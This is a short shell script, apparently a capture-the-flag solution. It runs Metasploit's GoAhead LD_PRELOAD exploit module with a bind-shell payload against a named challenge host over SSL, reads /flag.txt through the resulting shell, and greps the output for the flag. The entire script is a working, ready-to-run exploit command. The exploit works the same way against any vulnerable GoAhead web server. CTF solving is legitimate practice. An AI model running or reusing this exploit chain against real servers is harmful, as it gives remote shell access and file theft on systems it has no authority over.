#!/bin/sh

echo "cat /flag.txt ; exit" | msfconsole -q -x "use exploit/linux/http/goahead_ldpreload ; set target Linux x86_64 ; set payload generic/shell_bind_tcp ; set LPORT 5060 ; set RHOSTS msf1.tpas.pwning.re ; set RPORT 443 ; set SSL true ; exploit" -o tmp 2>/dev/null 
grep -oE "TPAS{.+}" tmp --color=none
rm tmp